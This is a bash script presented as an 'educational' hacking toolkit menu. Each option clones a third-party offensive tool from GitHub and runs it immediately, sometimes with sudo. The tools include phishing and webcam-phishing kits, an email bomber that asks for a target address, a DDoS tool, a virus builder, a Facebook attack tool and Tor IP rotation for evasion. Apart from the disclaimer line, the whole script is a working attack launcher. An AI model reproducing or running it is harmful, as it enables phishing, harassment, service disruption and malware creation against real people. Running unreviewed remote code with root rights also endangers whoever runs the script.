#!/bin/bash
# ==================================================
#   Hacking Toolkit Menu - Educational Only
#   Author: VivekXploit
#   Version: V1.0
# ==================================================

# -------- Colors --------
RED="\033[31m"
GREEN="\033[32m"
CYAN="\033[36m"
YELLOW="\033[33m"
RESET="\033[0m"
BOLD="\033[1m"

# -------- Banner (3 Styles + Disclaimer) --------
banner() {
    clear
    style=$((RANDOM % 3 + 1))
    case $style in
        1)
            echo -e "${CYAN}"
            echo " __      ___           _    __   __      _       _ _    "
            echo " \ \    / (_)         | |   \ \ / /     | |     (_) |   "
            echo "  \ \  / / ___   _____| | __ \ V / _ __ | | ___  _| |_  "
            echo "   \ \/ / | \ \ / / _ \ |/ /  > < | '_ \| |/ _ \| | __| "
            echo "    \  /  | |\ V /  __/   <  / . \| |_) | | (_) | | |_  "
            echo "     \/   |_| \_/ \___|_|\_\/_/ \_\ .__/|_|\___/|_|\__| "
            echo "                                  | |                   "
            echo "                                  |_|                   "
            echo -e "${RESET}"
            ;;
        2)
            echo -e "${CYAN}"
            echo "                                  )                           "
            echo "                            )  ( /(         (             )   "
            echo " (   (   (    )      (   ( /(  )\())        )\     (   ( /(   "
            echo " )\  )\  )\  /((    ))\  )\())((_)\  \`  )  ((_) (  )\  )\())  "
            echo "((_)((_)((_)(_))\  /((_)((_)\ __((_) /(/(   _   )\((_)(_))/   "
            echo "\\ \ / /  (_)_)((_)(_))  | |(_)\ \/ /((_)_\\ | | ((_)(_)| |_    "
            echo " \\ V /   | |\ V / / -_) | / /  >  < | '_ \\)| |/ _ \\| ||  _|   "
            echo "  \\_/    |_| \\_/  \\___| |_\_\ /_/\_\| .__/ |_|\___/|_| \\__|   "
            echo "                                    |_|                       "
            echo -e "${RESET}"
            ;;
        3)
            echo -e "${CYAN}"
            echo " _   _  _  _   _  ___ _  ___   _____ _   __  _ _____   "
            echo "| \ / || || \ / || __| |/ | \_/ / _,\ | /__\| |_   _|  "
            echo " \\ V /'| |'\\ V /'| _||   < > , <| v_/ || \\/ | | | |    "
            echo "  \\_/  |_|  \\_/  |___|_|\\_Y_/ \\_\\_| |___\\__/|_| |_|    "
            echo -e "${RESET}"
            ;;
    esac
    echo
    echo -e "${GREEN}======================================================================${RESET}"
    echo -e "              ${YELLOW}${BOLD}Author:${RESET} VivekXploit  ${GREEN}|${RESET}  ${YELLOW}${BOLD}Version:${RESET} V1.0"
    echo -e " ${RED}${BOLD}⚠️ Disclaimer: For educational purposes only. Unauthorized use is illegal.${RESET}"
    echo -e "${GREEN}======================================================================${RESET}"
    echo
}

# -------- Exit Banner --------
exit_banner() {
    clear
    echo -e "${GREEN}"
    echo "\"Stay ethical, stay strong — VivekXploit\""
    echo -e "${RESET}"
    exit 0
}

# -------- Ensure Tools Directory Exists --------
setup_tools_dir() {
    if [ ! -d "Tools" ]; then
        mkdir Tools
        echo -e "${GREEN}Created 'Tools' folder successfully.${RESET}"
    fi
}

# -------- Menu Display (Two Columns) --------
show_menu() {
    clear
    banner
    echo -e "${CYAN}${BOLD}                   ⚡ HACKING TOOLKIT MENU ⚡${RESET}"
    echo -e "${GREEN}=====================================================================${RESET}"
    echo
    echo -e "${YELLOW}[01]${RESET} 💀 Requirements & Update       ${YELLOW}[10]${RESET} 💻 Advanced Hacking Kit"
    echo -e "${YELLOW}[02]${RESET} 🎭 Phishing Tool               ${YELLOW}[11]${RESET} 🔎 Website Information Scanner"
    echo -e "${YELLOW}[03]${RESET} 📷 WebCam Hack                 ${YELLOW}[12]${RESET} ☠️  Virus Builder"
    echo -e "${YELLOW}[04]${RESET} 🌐 Subdomain Scanner           ${YELLOW}[13]${RESET} 📖 Info Gathering Tool"
    echo -e "${YELLOW}[05]${RESET} 📩 Gmail Bomber                ${YELLOW}[14]${RESET} 🛠️  Website Exploit Scanner"
    echo -e "${YELLOW}[06]${RESET} 🔥 DDOS Tool                   ${YELLOW}[15]${RESET} 😈 Facebook Attack Tool"
    echo -e "${YELLOW}[07]${RESET} 🗑️  Uninstall Tools            ${YELLOW} [16]${RESET} ⚔️  DarkArmy Toolkit"
    echo -e "${YELLOW}[08]${RESET} 🌍 IP Info Tracker             ${YELLOW}[17]${RESET} 🔄 Auto IP Changer"
    echo -e "${YELLOW}[09]${RESET} 🔎 Dorks-Eye Scanner           ${YELLOW}[00]${RESET} 🚪 Exit"
    echo
    echo -e "${GREEN}=====================================================================${RESET}"
    echo -e "${CYAN}${BOLD}   Select a number from the menu and press ENTER to continue...${RESET}"
    echo -e "${GREEN}=====================================================================${RESET}"
    echo
}

# -------- Handle Choices --------
handle_choice() {
    setup_tools_dir
    case $1 in
        01)  echo -e "${GREEN}Installing updates & requirements...${RESET}"
            apt install git -y
            apt install python python3 -y
            apt install pip pip3 -y
            apt install curl -y
            apt update && apt upgrade -y
            ;;
        02)  cd Tools && git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh ;;
        03)  cd Tools && git clone https://github.com/techchipnet/CamPhish && cd CamPhish && bash camphish.sh ;;
        04)  cd Tools && git clone https://github.com/zidansec/subscan && cd subscan && read -p "Enter a domain (example.com): " sc && ./subscan $sc ;;
        05)  cd Tools && git clone https://github.com/juzeon/fast-mail-bomber.git && cd fast-mail-bomber/ && mv config.example.php config.php && php index.php update-providers && php index.php update-nodes && php index.php refine-nodes && read -p "Enter target email: " mail && php index.php start-bombing $mail ;;
        06)  cd Tools && git clone https://github.com/palahsu/DDoS-Ripper.git && cd DDoS-Ripper && python3 DRipper.py ;;
        07)  rm -rf Tools && echo -e "${RED}All downloaded tools removed.${RESET}" ;;
        08)  cd Tools && git clone https://github.com/htr-tech/track-ip.git && cd track-ip && bash trackip ;;
        09)  cd Tools && git clone https://github.com/BullsEye0/dorks-eye.git && cd dorks-eye && pip install -r requirements.txt && python3 dorks-eye.py ;;
        10) cd Tools && apt update && apt install git python2 -y && git clone https://github.com/jaykali/hackerpro.git && cd hackerpro && sudo bash install.sh && python2 hackerpro.py ;;
        11) cd Tools && git clone https://github.com/Tuhinshubhra/RED_HAWK && cd RED_HAWK && php rhawk.php ;;
        12) cd Tools && git clone https://github.com/Devil-Tigers/TigerVirus && cd TigerVirus && bash app.sh ;;
        13) cd Tools && git clone https://github.com/king-hacking/info-site.git && cd info-site && bash info.sh ;;
        14) cd Tools && git clone https://github.com/MrSqar-Ye/BadMod.git && cd BadMod && sudo php BadMod.php ;;
        15) cd Tools && git clone https://github.com/fu8uk1/facebash && cd facebash && bash install.sh && sudo ./facebash.sh ;;
        16) cd Tools && git clone https://github.com/D4RK-4RMY/DARKARMY && cd DARKARMY && python2 darkarmy.py ;;
        17) cd Tools && git clone https://github.com/FDX100/Auto_Tor_IP_changer.git && cd Auto_Tor_IP_changer && sudo apt-get install tor && pip3 install requests && python3 install.py ;;
        00)  exit_banner ;;
        *)  echo -e "${RED}Invalid choice. Please try again.${RESET}" ;;
    esac
}

# -------- Main Loop --------
while true; do
    show_menu
    read -p "Enter your choice: " choice
    handle_choice $choice
    echo
    read -p "Press ENTER to return to menu..."
done
	
